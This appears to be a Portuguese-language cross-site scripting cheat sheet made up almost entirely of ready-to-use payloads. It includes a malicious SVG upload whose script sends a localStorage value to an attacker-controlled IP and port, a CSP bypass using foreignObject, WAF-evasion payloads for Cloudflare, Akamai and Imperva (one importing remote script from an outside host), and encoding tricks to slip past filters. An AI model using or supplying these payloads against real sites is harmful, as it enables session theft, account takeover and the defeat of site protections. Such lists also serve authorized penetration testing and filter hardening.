## Captura de Cookies
### SVG Upload File
Upload do arquivo .svg com o código para captura dos valores em um parâmetro armazenado no Local Storage
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      document.location='http://[IP]:1234/'+localStorage.getItem('[PARAMETRO]');
   </script>
</svg>
```
Bypass CSP - Content Security Policy Usa foreignObject
```
<svg width="600" height="400" xmlns="http://w3.org/2000/svg" xmlns:xhtml="http://w3.org/1999/xhtml">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://w3.org/1999/xhtml">
<iframe src='javascript:confirm(10)'></iframe>
    </body>
  </foreignObject>
</svg>
```
Bypass Geral
```
<Img+Src=javascript:alert(1)+OnError=location=src>

XSS Found in "/lib/css/animated.min'"/>
<script%20>alert(document.domain)<%2fscript>.css"
```
## Bypass Cloudflare WAF
```
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E

&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
Clean Payload "><track/onerror='confirm`1`'>

HTML entity & URL encoding:
" --> &#34; 
> --> &gt; 
< --> &lt;
' --> &#x27;
` --> \%60

## HTMLi
<Img Src=OnXSS OnError=alert(1)>

"><img src=x onerrora=confirm() onerror=confirm(1)>
```
## Bypass Akamai JSi
```
';k='e'%0Atop['al'+k+'rt'](1)//
```
## Bypass Imperva HTMLi
```
<Img Src=//X55.is OnLoad%0C=import(Src)>
```
## Basic XSS Encoding Tips
```
1) alert = window["al"+"ert"] 
2) bypass () with `` 
3) replace space with / 
4) encode symbols:

< = %3c
> = %3e
" = %22
[ = %5b
] = %5d
` = %60

Example Payload:
%3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
```

